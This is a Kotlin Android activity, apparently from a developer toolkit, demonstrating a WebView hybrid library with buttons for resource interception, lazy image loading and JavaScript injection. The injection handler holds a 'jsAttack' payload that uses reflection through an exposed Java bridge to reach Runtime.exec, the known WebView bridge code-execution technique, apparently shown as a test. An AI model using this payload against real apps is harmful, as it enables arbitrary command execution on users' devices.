package com.jiangkang.ktools.web

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.jiangkang.hybrid.Khybrid
import com.jiangkang.ktools.R
import com.jiangkang.ktools.databinding.ActivityHybridBinding

class HybridActivity : AppCompatActivity() {

    private val binding by lazy { ActivityHybridBinding.inflate(layoutInflater) }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)
        handleClick()
    }

    private fun handleClick() {

        binding.btnResourceInterceptor.setOnClickListener {
            Khybrid()
                    .isInterceptResources(true)
                    .loadUrl(this, "https://www.jiangkang.tech")
        }

        binding.btnImgLazyLoading.setOnClickListener {
            Khybrid()
                    .isLoadImgLazy(true)
                    .loadUrl(this, "https://www.jiangkang.tech")
        }


        binding.btnJsInject.setOnClickListener {
            val jsAttack = """
                (function(){
                    for (var obj in window) {
                        if ("getClass" in window[obj]) {
                             alert(obj);
                            return  window[obj].getClass().forName("java.lang.Runtime")
                                     .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
                        }
                    }
                })();
                """
            Khybrid()
                    .injectJs(jsAttack)
                    .loadUrl(this, "https://www.jiangkang.tech")

        }


    }
}
